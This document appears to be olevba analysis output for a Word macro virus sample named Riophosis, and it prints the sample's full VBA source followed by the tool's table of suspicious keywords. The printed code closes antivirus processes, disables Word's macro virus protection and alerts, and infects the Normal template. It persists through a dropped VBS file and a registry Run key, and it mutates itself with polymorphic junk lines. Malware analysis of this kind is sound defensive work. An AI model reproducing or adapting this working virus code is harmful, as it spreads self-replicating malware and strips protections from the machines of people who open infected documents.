olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Riophosis-8628e782099da73d9786fd70c772ff496166f227
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Riophosis-8628e782099da73d9786fd70c772ff496166f227 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub doCUMent_CLoSE()
For Each prOG In Tasks
If InStr(1, UCase(prOG.Name), Chr(78) & Chr(65) & Chr(86)) Then prOG.Close
If InStr(1, UCase(prOG.Name), Chr(65) & Chr(78) & Chr(84) & Chr(73) & Chr(86) & Chr(73) & Chr(82) & Chr(85) & Chr(83)) Then prOG.Close
Next
System.PrivateProfileString("", "hkeY_LoCAL_mACHinE\sOfTWAre\miCROSoFT\windowS\CURrentveRSiON\rUN\", "nAv AGent") = ""
BThhtrRgCFg = 122174.617662907 Or 684237.451576531  '
With Application
TsCnDimd = 896615.741090119 - 372813.924861789  '
.DisplayAlerts = wdAlertsNone
igPtclEIHFbn = 900332.981044292 Or 231596.417096436  '
.EnableCancelKey = wdCancelDisabled
With .Options
GgqnMlSrAp = fHiiKOfFfl And qioTEJNhtm '
.VirusProtection = 0
PnPMNTb = tpJSAAf Xor GAEsNTL '
.ConfirmConversions = 0
obQEfpqeHMm = 838557.239254117 - 640922.441905439  '
TJAGPoKbM = PkmcHidTG Or hnRiiofFR '
.SaveNormalPrompt = 0
End With
QgKbBGhEeMDLR = ieKOFmgInBefk And JQmFtheMlAHqH '
End With
If ThisDocument = ActiveDocument Then Set Target = NormalTemplate
KgHEFTQmclN = 738122.976800144 Xor 780054.981281519  '
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument
SoUrCEFILe = Environ$("WInDIr") & "\RIOpHoSiS.sYs"
OAfdgKAeOm = 551135.882941782 Or 461744.681191564  '
vbsbAcKuP = Environ$("wINdir") & "\RIOphOsIS.VBs"
nidhkII = 45578.0169562697 - 38600.8830299377  '
With ThisDocument.VBProject.vBcomPoNEnts(1).coDEmoduLE
vCODE = UCase(.linEs(1, .couNtOflINes))
EmBjgphL = 58848.9778445363 And 840217.822996974  '
pOLy
fQheiiPmHsdoin = ljCEOqFkMHJQKt Or AkoGClBnDqAFAB '
TDnDGOQcmDEAIr = NDRfSQQmJfgTji - NTcAEbEBSMboJO '
For COUnTer = 1 To Len(vCODE)
spqIbA = 656633.495301425 - 954210.996090174  '
snSBEDRrL = DEjArfFrd Xor qANtIPGis '
T = Mid(vCODE, COUnTer, 1)
ABoBrQk = 792404.097655535 Or 430627.332643569  '
ntnOMgKSOQL = OrFHCblEQpH Eqv jDrbnmQcghk '
If Asc(T) < 90 And Asc(T) > 65 Then T = Chr(Asc(T) + Int(Rnd * 2) * 32)
GAmisF = jpnpgm And sBpDbd '
NEWvcoDe = NEWvcoDe & T
Next
LobpJbIi = ABqTNggQ And GeEpfeMj '
tBJlRrRAFND = 654836.119035602 Or 49752.9605199695  '
Open SoUrCEFILe For Output As #1
Print #1, NEWvcoDe
gBHGTJLAL = 161819.534606695 - 189082.373840868  '
Close #1
AFqecqBt = TjOCDNEp Or lGrJjplD '
Open vbsbAcKuP For Output As #1
Print #1, "oN Error rESume neXT"
deOoDd = 625003.070484281 Xor 226898.502902448  '
Print #1, "SeT FSo = CrEAteoBjecT(""WoRD.ApPlicAtion"")"
Print #1, "WIth fsO.OptIoNS"
CFrHmEDF = 482081.0503968 Eqv 307276.239678562  '
Print #1, ".viRUspRotEcTION = 0"
Print #1, ".cOnfirMCONvErsioNs = 0"
iKRce = pQhob - lkDCi '
Print #1, ".SAvEnormALPRomPT = 0"
Print #1, ".ApPLiCATIOn.DiSPLAyAlertS = wDALERTsnOne"
cEtQF = 277688.523599803 - 97883.8418591022  '
Print #1, "eND wITH"
iEejcDCKMMc = 773366.333547413 - 58480.8003219366  '
Print #1, "wIth FSO.NoRmAlTeMPlAtE.vbPrOJeCT.VbcomPoneNTs(1)"
Print #1, ".cOdEmOdULE.DeleTeLineS 1, .COdEMODULe.CoUNtOFLInes"
kngmhTJQDmQeT = 55689.2195754647 - 78945.9154311419  '
Print #1, ".CoDEMOdulE.AdDFrOmFILE """ & SoUrCEFILe & """"
NMmCErpoANJN = OGjIFTABjCoh Xor kqOHciplnbRE '
Print #1, "eNd WitH"
bepGBTE = 485103.598910809 And 656972.883809388  '
Print #1, "fSO.noRMALTeMPLATe.sAvE"
nTJtcMRnKFHh = MsReHSDbmFMj Eqv AejRisrGoiNg '
Print #1, "FSO.qUiT"
EPoMh = JBcPD Eqv dGHIh '
Close #1
htKAPtogT = 618059.4939394 - 537890.075188458  '
djFhdmPgGJqKkf = LLRqsCGBACrElF Xor HqBRsBKMPRiMiL '
IHRBSRndtb = LdsMEHIsSf - BSnGoBKgrj '
HIJhijBsipE = 357827.424803138 Eqv 952009.500736892  '
System.PrivateProfileString("", "HKeY_LOCAL_mAcHine\SOftWARE\MICrOSoft\wINDOWS\cuRreNtVErsIoN\ruN\", "RiOpHosiS") = vbsbAcKuP
LgSAooAH = OTPhDQMr Eqv hpntDSEq '
OtSbh = 206962.9149279 - 351808.673001766  '
End With
AHAtikM = DoiSfRo Eqv IheKBtk '
With Target.VBProject.vBcomPoNEnts(1).coDEmoduLE
GoElFrB = rAldTkB Or ACKbklH '
JsFCECH = KeJBCld Eqv fsASmNS '
.dELETElinES 1, .couNtOflINes
dFJrANCrPDM = AANcMnbCDRc + pMmAQEqncgA '
.AddFromFile SoUrCEFILe
sjmoRhEc = 328722.923096359 Eqv 571244.860654593  '
End With
HgtQsd = 932955.464577019 + 178833.901862025  '
ekSSMdBK = mESKJSRh Xor qBdQKMPE '
End Sub
Private Sub pOLy()
With ThisDocument.VBProject.vBcomPoNEnts(1).coDEmoduLE
iRLNT = BspjG - lGpLR '
For I = 1 To .couNtOflINes
nJrjTcrlSk = 518319.922925591 Xor 186108.462668359  '
A = Int(Rnd * 6) + 1
If A = 1 Then oper = Space(1) & "XOR" & Space(1)
ABTmA = SsIpA Eqv SimeP '
If A = 2 Then oper = Space(1) & "ANd" & Space(1)
thjqBERKIcS = leIRjOrCpLH Or pARqEGFDBTj '
If A = 3 Then oper = Space(1) & "oR" & Space(1)
cSjSpGPB = bkSMhKLd + AQNftrDJ '
If A = 4 Then oper = Space(1) & "+" & Space(1)
pnnsHnMk = SgnsoPsJ Xor HOrPIAJn '
If A = 5 Then oper = Space(1) & "-" & Space(1)
If A = 6 Then oper = Space(1) & "eqv" & Space(1)
LoocAtgoLn = 218693.812544525 - 137661.08098197  '
A = Int(Rnd * 2) + 1
For II = 1 To 5 + Int(Rnd * 10)
NrLoNQsJELARd = 146328.89896667 And 160236.973265827  '
juNK1 = juNK1 & Chr(Int(Rnd * 20) + 97)
If A = 1 Then junk2 = junk2 & Chr(Int(Rnd * 20) + 97)
jLDhkeQ = 172567.671823025 Or 88722.7959321141  '
If A = 2 Then junk2 = Space(1) & Rnd * 999999 & Space(1)
If A = 1 Then juNk3 = juNk3 & Chr(Int(Rnd * 20) + 97)
jqALnpjiEHk = LLgSbEblNJq - iIogJTOBQok '
jjBcNqG = pDOBtAh - PlnAhnR '
If A = 2 Then juNk3 = Space(1) & Rnd * 999999 & Space(1)
Next
IjQRO = RRCej + TlLKA '
If Right(.linEs(I, 1), Len(I) - 1) = "'" Then .REPlACELINe I, juNK1 & "=" & junk2 & oper & juNk3 & "'"
juNK1 = ""
bjICqNtHtnEFh = DFCFAkCGQqsfl - qFiImbTIAOtTS '
junk2 = ""
EPliLllHM = knRoKNGLC Xor noEpgeLtq '
juNk3 = ""
thhlHL = Ipmsgs - eLKFMt '
Next
cEEFpGMJbAr = 464736.354530454 And 531917.576545179  '
End With
KmIliEEhrjB = seotDeebKpf + KjlnRMgkHSb '
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |doCUMent_CLoSE      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|rUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CrEAteoBjecT        |May create an OLE object                     |
|Suspicious|windowS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vBcomPoNEnts        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|coDEmoduLE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RIOphOsIS.VBs       |Executable file name                         |
|Hex String|        vUS         |09765553                                     |
|Hex String|3&CV                |33264356                                     |
|Hex String|35GA                |33354741                                     |
|Hex String|F&h5                |46266835                                     |
|Hex String|5E0E                |35453045                                     |
+----------+--------------------+---------------------------------------------+

